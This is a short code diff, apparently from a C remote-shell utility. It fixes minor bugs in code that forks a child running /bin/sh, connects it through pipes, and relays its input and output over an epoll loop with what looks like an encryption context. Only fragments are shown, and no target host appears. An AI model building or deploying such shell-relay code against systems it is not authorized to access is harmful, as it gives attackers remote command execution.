@@ -59,7 +59,7 @@ typedef struct sc_properties_t {
   int         efd;
   struct      epoll_event evts[1];
   spp_ctx     c;  
-  spp_blk     x; 
+  spp_buf     x; 
 } p_tbl;
 
 void main(int argc, char *argv[])
@@ -77,7 +77,7 @@ void main(int argc, char *argv[])
     // execute /bin/sh as child process
     p.pid = syscall(SYS_fork);
     
-    if (!p.pid) 
+    if (p.pid==0) 
     {
       // assign read end to stdin
       syscall(SYS_dup2,  p.in[0], STDIN_FILENO );
@@ -123,7 +123,7 @@ void main(int argc, char *argv[])
         for (i=0; i<2; i++)
         {
           p.evts[0].data.fd = h[i];
-          p.evts[0].events  = EPOLLIN;;
+          p.evts[0].events  = EPOLLIN;
           
           syscall(SYS_epoll_ctl, p.efd, 
               EPOLL_CTL_ADD, h[i], &p.evts[0]);
@@ -166,8 +166,8 @@ void main(int argc, char *argv[])
         }
         // remove 2 descriptors 
         for (i=0; i<2; i++) {
-          syscall(SYS_epoll_ctl(p.efd, 
-              EPOLL_CTL_DEL, p.h[i], NULL));
+          syscall(SYS_epoll_ctl, p.efd, 
+              EPOLL_CTL_DEL, h[i], NULL);
         }            
         syscall(SYS_close, p.efd);
       }
